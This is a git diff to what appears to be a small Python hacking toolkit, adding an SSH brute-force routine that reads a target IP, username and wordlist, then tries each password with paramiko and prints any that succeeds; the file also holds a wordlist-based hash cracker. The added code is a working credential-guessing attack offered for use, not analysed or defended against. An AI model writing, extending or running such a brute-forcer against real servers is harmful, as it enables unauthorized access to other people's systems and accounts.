@@ -14,6 +14,7 @@
 import pyfiglet,sys,time,hashlib
 import paramiko
 
+
 def section_print(title):
         print("\n" + "=" * 50)
         print(title)
@@ -34,7 +35,6 @@ def hash_cracker(wordlist, type, input):
                                 end = time.time()
                                 print(f"Hash Cracker\n |  Wordlist : {wordlist}.\n |  Hash Type : {type}.\n |  Hash : {input}.\n |  Password founded : {line.strip()}\n |_ Time elapsed : {end - start}s.")
                                 exit(0)
-        
 
 
 def menu():
@@ -45,8 +45,13 @@ def menu():
 
         if x == 1:
                 section_print("SSH BruteForce")
+                ip = str(input("Enter SSH IP :\n>"))
+                user = str(input("Enter username :\n>"))
+                wordl = str(input("Enter wordlist :\n>"))
+                ssh_bruteforce(ip,user,wordl)
         elif x == 2:
                 section_print("HTTP BruteForce")
+
 
 def ssh_connect(ip, username, password, port=22):
     try:
@@ -57,6 +62,13 @@ def ssh_connect(ip, username, password, port=22):
         return (True, password)
     except:
         return False
+
+def ssh_bruteforce(ip, username, wordlist):
+        with open(f"wordlists\{wordlist}.txt", 'r') as file:
+                for line in file.readlines():
+                        if ssh_connect(ip, username, line.strip().encode(), port=22):
+                                print(f"Mot de passe trouvé ! : {line.strip().encode()}")
+
 
 try:
         menu()
